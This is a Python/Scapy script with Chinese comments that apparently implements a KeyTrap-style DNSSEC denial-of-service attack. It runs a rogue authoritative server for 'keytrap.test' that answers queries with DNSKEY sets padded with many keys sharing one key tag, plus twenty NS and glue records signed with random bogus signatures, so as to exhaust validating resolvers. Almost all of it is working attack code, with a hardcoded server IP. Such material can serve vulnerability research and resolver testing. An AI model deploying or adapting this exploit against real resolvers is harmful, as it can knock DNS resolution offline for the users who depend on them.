from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
from scapy.layers.inet import IP, UDP, TCP
from datetime import datetime
from functools import reduce
import base64

# 配置DNS服务器的IP和端口
IFACE_LAN = "eth0"
PORT_OF_SERVER = "53"
DOMAIN_NAME = ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test.", "_ta-75b2.keytrap.test."]
GLOBAL_TTL = 86400
INCEPTION = datetime.strptime("20240928101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
EXPIRATION = datetime.strptime("20241028101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8

BPF_FILTER = "udp port " + PORT_OF_SERVER 

RRSIG={
    "www.keytrap.test." : base64.b64decode("miPfV54xrE5E5agBhS2jinqxdKflX7g6AXdScbGBAiarZYikQDKRvx2uYUWh+ikSMHQlms+8UmxNcme0xkn2hf4z7gTRSYlPoz29HZWMN3aYzFYWkjcweCB6zcVVsun+"),
    # RRSIG FOR NS
    "keytrap.test."     : base64.b64decode("Te5cukUZ4ijYiy/saD5savrKd6PW7K5f+Vz0XfHrAIR4FG3zAag3GplJhW9vS59qCEFYHNn5XabANs3uaH5BUU+aiSMjmMw4/F5OJHJo11hXi3PYR0g5sGL+eiK2tWLp"),
    "ZSK": base64.b64decode("0rrYEGNp6ZesEserq0qM+fo+xXswWmtYOI1P+1SLmj+FqHqrYzMFtMu13NeRbYzq6dM7zFQoEi4Bw1p7BSUdqguHPRGkggrfIZEdA4EjIEtQHK5TRmVt5kl/gIX8kq8D"),
    "KSK": base64.b64decode("w/ruTlQ5LrnVOCGsKZbxzXo2DSHVnx6htRCSQTglDR6f6eT8H1TUCMo3pBO+qFC3gcxrJLcFIo02TpcYMcnMTV/7ya7cwcisR10uXGCSDagWhD9gXp7ShWLWwTgnYvUa"),
}

# keytag = 6350
SPF_DNSKEY=[
"qz2ys56wu+rPHXp62eskqFa/lYw4xl7oDT5X/wcj7fFapLq8zsOT3kM5E7IlKwa42cIqCcNcb6hG8C8YKWUOgUTOiXPXj7k4SO4K3/+CfFp+7J6ai8shKSFAMvhf2ajl",
"NJAIrXpcToloZ5CnSwyPf/Y8qyL3aFlqFr8Xcw/m19dBcyoJQIak5ygffLTHGrQhZNGM8TrL07v41sL1ZYuYjGBg7RBdMaeQr+JOUA4d5e/r83fkT7uHNOcHzOAhI7Nu",
"UiTl5T9RdFXTul4Nw3rQ9/zlGCODylgcI9mrz5SqpEkxw9+l+E00/JGxAj6If8yjE7Etexs/KTCX7csAYQTLq864iYB+5sPigcMHAzluyPU9fOUmALQbRtw3ZXPHBb7L",
"MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor",
"8y5y+PlI/MQAMADANSuw0UXq7WUGpGr+U+Y4sl+dAu78T+rZ1NUE1TVg5fZU7j7bO+Ie7Mk6DcquNT0zYX986pGJgXpx6jTDh3dztnt9Sc9SBcUdBw0v/u1y72EfLQ2P",
"EUCex5BxNR/cKQUYoHJD1Hj6TK+aMpntzC98Nv+ZegTklzXAxMxC8nAc9VSywVHBjTrkCnVYrY4Gu1YQfscREc+mjbyhUzEMZBHPIEAfuerZwu2wovC4mau3RVWHRhij",
"Mq9Ohq02Xq6D5GprEXuvkZFumkDNmUUEAmKtGG/7FfVeeu3ZMQankbw0eID2p8MB4dcSDotv4YHvx6Sx3t6zdjSFaCloAveMUnvtIQsXL8Kbfm2G0ikVuXtbMSHmFM9w",
"Nd/hhlFfE9YcGAKn/DjwaRDo2x1shj8A59LMXfNuxgPtRH1fT5k9EB1twCTEzqAQNLyx9a6t+Kma/LBXtapxM78FXNaleSnF2fJ40+7rCBnn1cFjvdHEPHkW4XUGToyO",
]
for i in range(len(SPF_DNSKEY)):
    SPF_DNSKEY[i] = base64.b64decode(SPF_DNSKEY[i])


DNSKEY={
    "ZSK": base64.b64decode("DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb"),
    "KSK": base64.b64decode("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hl hZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zht L4aGaOG+870yHwuY"),
}


def gen_random_rrsig(len=96):
    return os.urandom(len)



# 构造DNS响应
def craft_dns_response(pkt, qname, qtype):
    reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
    

    # 查询A记录
    if qtype == 1:

        ns_list =  [DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL,
                             expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
                             signersname="keytrap.test", signature=RRSIG["keytrap.test."]),]
        
        glue_list = []

        for i in range(20):
            ns_list.append(DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata=f"ns{i}.keytrap.test."))
            glue_list.append(DNSRR(rrname=f"ns{i}.keytrap.test.", type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40"))
            glue_list.append(DNSRRRSIG(rrname=f"ns{i}.keytrap.test.", labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, signersname="keytrap.test", signature=gen_random_rrsig()))
        
        llns = reduce(lambda x, y: x / y, ns_list)
        llglue = reduce(lambda x, y: x / y, glue_list)

        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                        an=
                            DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["www.keytrap.test."]),
                        ns= llns,
                        ar= llglue
                    )

    # 查询DNSKEY记录
    elif qtype == 48:

        key_list = [
            DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=256, publickey=DNSKEY["ZSK"]) /  DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=257, publickey=DNSKEY['KSK']),
            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=48, originalttl=GLOBAL_TTL,
            expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
            signersname="keytrap.test.", signature=RRSIG["ZSK"]),
            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=48, originalttl=GLOBAL_TTL,
            expiration=EXPIRATION, inception=INCEPTION, keytag=30130, algorithm=14, 
            signersname="keytrap.test.", signature=RRSIG["KSK"]),
        ]

        for key in SPF_DNSKEY:
            key_list.append(DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=256, publickey=key))
        
        keyset = reduce(lambda x, y: x / y, key_list)

        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                    an=keyset 
                )
    else:
        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd, rcode=3,
                         ns=
                            DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata="ns1.keytrap.test.") /
                            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["keytrap.test."])
                        )
        
    return reply_pkt

# 处理DNS查询请求
def dns_response(pkt):
    try:
        if DNS not in pkt:
            return

        qname = pkt[DNS].qd.qname.decode("utf-8")
        
        if qname not in DOMAIN_NAME:
            return

        qtype = pkt[DNS].qd.qtype
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : fm {pkt[IP].src}:{pkt[UDP].sport} : {qname} {qtype} ?")

        # 构建DNS响应
        resp = craft_dns_response(pkt, qname, qtype)
        # resp.show2()
        send(resp, iface=IFACE_LAN)
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : to {pkt[IP].src}:{pkt[UDP].sport} : {qname}\n")

    except Exception as error:
        print("Error: ", error)

print("Start DNS Authority ...")
sniff(filter=BPF_FILTER, prn=dns_response, iface=IFACE_LAN)

# rec = IP(src="124.222.27.40")/UDP(dport=53)/DNS(qd=DNSQR(qname="www.keytrap.test.", qtype=1))
# pkt=craft_dns_response(rec, "www.keytrap.test.", 1)
# pkt.show2()

